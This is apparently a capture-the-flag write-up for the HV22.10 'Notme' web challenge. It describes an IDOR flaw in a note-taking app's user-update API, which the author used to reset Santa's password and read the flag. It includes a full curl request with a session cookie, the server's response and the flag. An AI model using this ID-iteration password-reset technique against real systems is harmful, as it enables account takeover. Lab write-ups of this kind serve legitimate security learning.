# [HV22.10] Notme

<table>
  <tr>
    <th>Categories</th>
    <td>Web security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>HaCk0</td>
  </tr>
</table>

## Description
Santa brings you another free gift! We are happy to announce a free note taking webapp for everybody. No account name restriction, no filtering, no restrictions and the most important thing: no bugs! Because it cannot be hacked, Santa decided to name it Notme = Not me you can hack!

Or can you?

## Solution
Fast-forward: It turned out, the way I solved this challenge was not the intended one. I only found out about this when reading the flag.

I approached the challenge as other "web security" challenges: Looking at API traffic and trying out variations of the requests or simply other user IDs.
While doing so, I realised a few things:

- my user seems to have a `user` role.
- passwords were simply SHA-256 hashes.
- there must have been an additional user somewhere (Santa, is it you?)

I discovered, that the user update request did not check the user ID, so I could update the password for any user on the system.
A classical (unintended) Insecure Direct Object Reference (IDOR) vulnerability.

Iterating through the user IDs (using Burp Suite), I was able to update the password of user `1337`, which happened to be Santa.
```
$ curl 'https://4503b1b0-2da2-49a6-a974-d3f5df08a0a4.idocker.vuln.land/api/user/1337'   -H 'content-type: application/json'   -H 'cookie: connect.sid=s%3A36fy1tBYkOnN9bmgg66SaGJM05jlPWJL.mERSYxoLsvQY0HKKRfK%2B7HcTCIFLdA2GLxDrvE6ttSA'   --data-raw '{"password":"test"}'   -i
HTTP/2 200 
content-type: application/json; charset=utf-8
date: Fri, 09 Dec 2022 23:37:54 GMT
etag: W/"c8-XrArzR2AlPhw3vjMP3KIXgaJz2Q"
x-powered-by: Express
content-length: 200

{"id":1337,"role":"user","username":"Santa","password":"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08","createdAt":"2022-12-09T23:00:55.271Z","updatedAt":"2022-12-09T23:35:31.831Z"}
```

After logging in as santa, there was a note containing the flag.

## Flag
```
HV22{Sql1_is_An_0Ld_Cr4Ft}
```
